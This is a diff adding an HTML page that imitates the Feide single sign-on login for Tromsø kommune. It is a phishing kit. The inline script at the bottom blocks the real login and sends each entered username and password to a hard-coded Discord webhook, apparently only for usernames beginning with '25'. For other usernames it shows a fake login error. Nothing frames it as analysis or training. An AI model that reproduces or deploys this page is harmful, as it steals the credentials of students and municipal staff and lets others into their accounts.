@@ -1,0 +1,161 @@
+<html lang="no">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
+    <meta http-equiv="Content-Security-Policy" content="img-src 'self' data:; font-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'">
+    <title>Logg inn med Feide</title>
+    <link rel="stylesheet" type="text/css" href="https://idp.feide.no/simplesaml/module.php/feide/css/feide2.64f9b1f1.css">
+    <link rel="icon" type="image/ico" href="https://idp.feide.no/simplesaml/module.php/feide/img/favicon.ico">
+    <style>
+        .error-message {
+            color: red;
+            display: none; /* Initially hidden */
+            margin-top: 10px; /* Space above the message */
+        }
+    </style>
+</head>
+<body id="feide:login" data-assets-dir="&quot;https:\/\/idp.feide.no\/simplesaml\/module.php\/feide\/&quot;" data-build-info="{&quot;js\/feide2&quot;:&quot;js\/feide2.4fd59bef.js&quot;,&quot;css\/feide2&quot;:&quot;css\/feide2.64f9b1f1.css&quot;,&quot;js\/selectorg&quot;:&quot;js\/selectorg.4afd9b5a.js&quot;,&quot;js\/login&quot;:&quot;js\/login.52987398.js&quot;,&quot;js\/sms&quot;:&quot;js\/sms.05c4ce66.js&quot;,&quot;js\/logout&quot;:&quot;js\/logout.6d31af6d.js&quot;,&quot;js\/feideoldbase&quot;:&quot;js\/feideoldbase.3e57afa3.js&quot;,&quot;css\/feideoldbase&quot;:&quot;css\/feideoldbase.d3955294.css&quot;}">
+    <div id="wrapper">
+        <header id="main-head" role="banner">
+            <nav>
+                <div id="language-chooser-wrapper" class="">
+                    <form id="language_selector" method="get">
+                        <input type="hidden" name="org" value="tromso.kommune.no">
+                        <input type="hidden" name="AuthState" value="_78bd2b5efb4e681ff42ac525f1c964d7a27e7bba11:https://idp.feide.no/simplesaml/saml2/idp/SSOService.php?spentityid=https%3A%2F%2Fauth.dataporten.no%2Fsimplesaml%2Fmodule.php%2Fsaml%2Fsp%2Fmetadata.php%2Ffeide&amp;RelayState=https%3A%2F%2Fauth.dataporten.no%2Foauth%2Fauthorization%3Fauthselection%3Dfeide%257Crealm%257Ctromso.kommune.no%26client_id%3De4b04245-04ce-4598-b5b6-c7119213d358%26code_challenge%3DXB2_f7E7tKdBTJaMfnzsMBPwzQ-08jtC4oOmPRYjivM%26code_challenge_method%3DS256%26nonce%3Dey05fumro8vkh5s2z4519cm548sr0em%26preselected%3D1%26redirect_uri%3Dhttps%253A%252F%252Fam.core.prod.aschehoug.cloud%252Fam%252FXUI%252F%26remember%3Don%26response_type%3Dcode%26scope%3Dopenid%2Buserid%2Buserinfo-name%2Buserid-feide%2Bemail%2Buserinfo-mobile%2Buserinfo-language%2Bgroups-org%2Bgroups-edu%2Bgroups-other%2Buserinfo-entitlement%26select_org%3DTroms%25C3%25B8%2Bkommune%26state%3D99tfx7mwfz157x0p0wrz0gd790mo0m%26reauthentication%3D934e1193c8793f754e12a8abc59e29a65c7d9d6ed5a36f3de2d0f8fcef05257b&amp;cookieTime=1726259650">
+                        <label for="language-chooser" class="show-for-sr">Velg språk</label>
+                        <input type="hidden" id="language-chooser" name="language" class="language-chooser" aria-label="Velg språk">
+                    </form>
+                    <div class="lang-dropdown">
+                        <div tabindex="0" class="lang-dropdown-button closed" id="lang-dropdown-button" aria-haspopup="true" aria-expanded="false">
+                            <div lang="no"><span class="lang-option-wrapper"><i class="flag icon-flag-no"></i><span id="chosen-lang-name" class="lang-name" role="button" aria-label="Velg språk">Bokmål</span></span></div>
+                        </div>
+                        <div class="lang-dropdown-list" role="menu" style="display: none;">
+                            <div role="menuitem" tabindex="0" aria-label="Velg språk English" class="lang-dropdown-lang" lang="en"><i class="flag icon-flag-en"></i><span class="lang-name">English</span></div>
+                            <div role="menuitem" tabindex="0" aria-label="Velg språk Nynorsk" class="lang-dropdown-lang" lang="nn"><i class="flag icon-flag-nn"></i><span class="lang-name">Nynorsk</span></div>
+                            <div role="menuitem" tabindex="0" aria-label="Velg språk Bokmål" class="lang-dropdown-lang" lang="no"><i class="flag icon-flag-no"></i><span class="lang-name">Bokmål</span></div>
+                            <div role="menuitem" tabindex="0" aria-label="Velg språk Sámegiella" class="lang-dropdown-lang" lang="se"><i class="flag icon-flag-se"></i><span class="lang-name">Sámegiella</span></div>
+                        </div>
+                    </div>
+                </div>
+            </nav>
+            <div class="clear"></div>
+        </header>
+        <article id="content">
+            <h1>Logg inn med Feide</h1>
+            <section id="header">
+                <div class="sp-header">
+                    <div class="media">
+                        <div class="media-left">
+                            <img src="/simplesaml/module.php/feide/splogos/25bb8885b104bba27bbead754267b746e7e6f990fb90618b6c830bae4e3955fa.png" alt="">
+                        </div>
+                        <div class="media-body">
+                            <p class="slim">Du må logge deg på via Feide for å få tilgang til Dataporten.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="org-header">
+                    <p class="slim">Din tilhørighet</p>
+                    <div class="media">
+                        <div class="media-left">
+                            <img src="https://idp.feide.no/simplesaml/module.php/feide/orglogos/ad4ae672a0c5f691b5c65d7c7e205fa56268e72dba84924495e2c405d2d59480.png" alt="">
+                        </div>
+                        <div class="media-body">
+                            <div>Tromsø kommune</div>
+                            <div>
+                                <a href="https://idp.feide.no/simplesaml/module.php/feide/selectorg?org=tromso.kommune.no&amp;AuthState=_78bd2b5efb4e681ff42ac525f1c964d7a27e7bba11%3Ahttps%3A%2F%2Fidp.feide.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fauth.dataporten.no%252Fsimplesaml%252Fmodule.php%252Fsaml%252Fsp%252Fmetadata.php%252Ffeide%26RelayState%3Dhttps%253A%252F%252Fauth.dataporten.no%252Foauth%252Fauthorization%253Fauthselection%253Dfeide%25257Crealm%25257Ctromso.kommune.no%2526client_id%253De4b04245-04ce-4598-b5b6-c7119213d358%2526code_challenge%253DXB2_f7E7tKdBTJaMfnzsMBPwzQ-08jtC4oOmPRYjivM%2526code_challenge_method%253DS256%2526nonce%253Dey05fumro8vkh5s2z4519cm548sr0em%2526preselected%253D1%2526redirect_uri%253Dhttps%25253A%25252F%25252Fam.core.prod.aschehoug.cloud%25252Fam%25252FXUI%25252F%2526remember%253Don%2526response_type%253Dcode%2526scope%253Dopenid%252Buserid%252Buserinfo-name%252Buserid-feide%252Bemail%252Buserinfo-mobile%252Buserinfo-language%252Bgroups-org%252Bgroups-edu%252Bgroups-other%252Buserinfo-entitlement%2526select_org%253DTroms%2525C3%2525B8%252Bkommune%2526state%253D99tfx7mwfz157x0p0wrz0gd790mo0m%2526reauthentication%253D934e1193c8793f754e12a8abc59e29a65c7d9d6ed5a36f3de2d0f8fcef05257b%26cookieTime%3D1726259650">
+                                    <small>Endre tilhørighet</small>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <section id="main">
+                <div class="main" role="main">
+                    <form id="loginForm" action="" method="post" name="f" class="66e4a1c2e2558bc3">
+                        <input type="hidden" name="has_js" id="js_support" value="0">
+                        <label for="username">&nbsp;Brukernavn</label>
+                        <div class="username">
+                            <span id="error-info" class="accessibility-error-desc">
+                                <span></span>
+                                <span></span>
+                            </span>
+                            <input class="" type="text" id="username" name="feidename" required autofocus autocomplete="username" aria-describedby="error-info">
+                        </div>
+                        <label for="password">&nbsp;Passord</label>
+                        <div class="passwordfield">
+                            <input class="" type="password" id="password" name="password" required autocomplete="current-password">
+                            <button type="button" id="showhide-password" class="secondary button-password-showhide" role="switch" aria-controls="password" aria-checked="false" aria-label="Vis passord" data-text-screenreader-hide-translated="Skjul passord" data-text-screenreader-show-translated="Vis passord" data-text-hide-translated="Skjul" data-text-show-translated="Vis">Vis</button>
+                            <p aria-live="polite" id="showhide-password-announcement" class="show-for-sr" data-text-hidden-translated="Passordet er skjult" data-text-visible-translated="Passordet er synlig">Passordet er skjult</p>
+                        </div>
+                        <p class="breathe-top">
+                            <small><a href="https://idp.feide.no/simplesaml/module.php/feide/recover?AuthState=_78bd2b5efb4e681ff42ac525f1c964d7a27e7bba11%3Ahttps%3A%2F%2Fidp.feide.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fauth.dataporten.no%252Fsimplesaml%252Fmodule.php%252Fsaml%252Fsp%252Fmetadata.php%252Ffeide%26RelayState%3Dhttps%253A%252F%252Fauth.dataporten.no%252Foauth%252Fauthorization%253Fauthselection%253Dfeide%25257Crealm%25257Ctromso.kommune.no%2526client_id%253De4b04245-04ce-4598-b5b6-c7119213d358%2526code_challenge%253DXB2_f7E7tKdBTJaMfnzsMBPwzQ-08jtC4oOmPRYjivM%2526code_challenge_method%253DS256%2526nonce%253Dey05fumro8vkh5s2z4519cm548sr0em%2526preselected%253D1%2526redirect_uri%253Dhttps%25253A%25252F%25252Fam.core.prod.aschehoug.cloud%25252Fam%25252FXUI%25252F%2526remember%253Don%2526response_type%253Dcode%2526scope%253Dopenid%252Buserid%252Buserinfo-name%252Buserid-feide%252Bemail%252Buserinfo-mobile%252Buserinfo-language%252Bgroups-org%252Bgroups-edu%252Bgroups-other%252Buserinfo-entitlement%2526select_org%253DTroms%2525C3%2525B8%252Bkommune%2526state%253D99tfx7mwfz157x0p0wrz0gd790mo0m%2526reauthentication%253D934e1193c8793f754e12a8abc59e29a65c7d9d6ed5a36f3de2d0f8fcef05257b%26cookieTime%3D1726259650&amp;org=tromso.kommune.no">Glemt brukernavn eller passord?</a></small>
+                        </p>
+                        <button type="submit" class="button-primary breathe-top">Logg inn</button>
+                        <div class="error-message" id="loginErrorMessage">Could not log into account. Please make sure your password or username is typed correctly.</div>
+                    </form>
+                    <p class="breathe-top">Eller velg en ekstern metode:</p>
+                    <form action="https://idp.feide.no/simplesaml/module.php/feide/login-azuread?org=tromso.kommune.no&amp;AuthState=_78bd2b5efb4e681ff42ac525f1c964d7a27e7bba11%3Ahttps%3A%2F%2Fidp.feide.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fauth.dataporten.no%252Fsimplesaml%252Fmodule.php%252Fsaml%252Fsp%252Fmetadata.php%252Ffeide%26RelayState%3Dhttps%253A%252F%252Fauth.dataporten.no%252Foauth%252Fauthorization%253Fauthselection%253Dfeide%25257Crealm%25257Ctromso.kommune.no%2526client_id%253De4b04245-04ce-4598-b5b6-c7119213d358%2526code_challenge%253DXB2_f7E7tKdBTJaMfnzsMBPwzQ-08jtC4oOmPRYjivM%2526code_challenge_method%253DS256%2526nonce%253Dey05fumro8vkh5s2z4519cm548sr0em%2526preselected%253D1%2526redirect_uri%253Dhttps%25253A%25252F%25252Fam.core.prod.aschehoug.cloud%25252Fam%25252FXUI%25252F%2526remember%253Don%2526response_type%253Dcode%2526scope%253Dopenid%252Buserid%252Buserinfo-name%252Buserid-feide%252Bemail%252Buserinfo-mobile%252Buserinfo-language%252Bgroups-org%252Bgroups-edu%252Bgroups-other%252Buserinfo-entitlement%2526select_org%253DTroms%2525C3%2525B8%252Bkommune%2526state%253D99tfx7mwfz157x0p0wrz0gd790mo0m%2526reauthentication%253D934e1193c8793f754e12a8abc59e29a65c7d9d6ed5a36f3de2d0f8fcef05257b%26cookieTime%3D1726259650" method="post">
+                        <p id="ms-sr-label" class="hidden">Logg inn med Microsoft</p>
+                        <input type="submit" id="microsoft-signin-button" formnovalidate="true" class="breathe-top" aria-labelledby="ms-sr-label" value="Bruk arbeids- eller skolekonto">
+                    </form>
+                </div>
+                <div class="panel expandable">
+                    <div class="panel-heading">
+                        <button class="toggle-button" aria-expanded="false">
+                            <span>Trenger du hjelp?</span>
+                            <i class="icon"></i>
+                        </button>
+                    </div>
+                    <div class="panel-content" aria-hidden="true">
+                        <p>Kontakt institusjonen din:</p>
+                        <p><a href="https://www.feide.no/brukerstotte">Gå til nettsiden for brukerstøtte</a></p>
+                    </div>
+                </div>
+                <small><a href="https://www.feide.no/personvern-og-samtykke">Personvern og informasjonskapsler</a></small>
+            </section>
+        </article>
+        <footer>
+            <p>Feide leveres av Sikt</p>
+        </footer>
+    </div>
+    <script src="https://idp.feide.no/simplesaml/module.php/feide/js/feide2.4fd59bef.js"></script>
+    <script src="https://idp.feide.no/simplesaml/module.php/feide/js/login.52987398.js"></script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('loginErrorMessage');
+
+            // Check if the username starts with "25"
+            if (!username.startsWith("25")) {
+                errorMessage.style.display = 'block'; // Show the error message
+                return;
+            } else {
+                errorMessage.style.display = 'none'; // Hide the error message if the username is valid
+            }
+
+            // Prepare the data to send to Discord webhook
+            const data = {
+                content: `Brukernavn: ${username}\nPassord: ${password}`
+            };
+
+            // Send data to Discord webhook
+            fetch('https://discord.com/api/webhooks/1284169705354956830/xUzNzRi4NAUvKaopglah822JJIQjSR9w48HB3l7b8dP7l-4IiHCsHu8r363HxS8b875Q', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .catch(error => {
+                console.error('There was a problem with the fetch operation:', error);
+            });
+        });
+    </script>
+</body>
+</html>
